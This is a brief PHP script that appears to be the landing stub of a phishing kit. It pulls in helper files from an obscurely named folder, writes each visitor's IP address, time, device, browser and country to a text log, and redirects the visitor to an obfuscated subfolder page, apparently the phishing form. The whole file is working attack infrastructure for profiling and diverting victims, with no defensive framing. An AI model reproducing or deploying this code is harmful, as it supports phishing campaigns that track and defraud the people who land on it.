<?php

include('./CORRSPOTEBDJKL/Conan/911.php');
include('./CORRSPOTEBDJKL/Conan/COUNTRY.php');
include('./CORRSPOTEBDJKL/Conan/SYS.php');
include('./CORRSPOTEBDJKL/X_911.php');

	$file = fopen("911.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".$date."/DEVICE=".$user_os."/BROWSER=".$user_browser." >> [$get_user_country]\n");
header("Location: ./CORRSPOTEBDJKL/index.php?FGDD=1#HDHKJDJDSSJDSJKJDSJDSDJJDSHYKJHGFG");
?>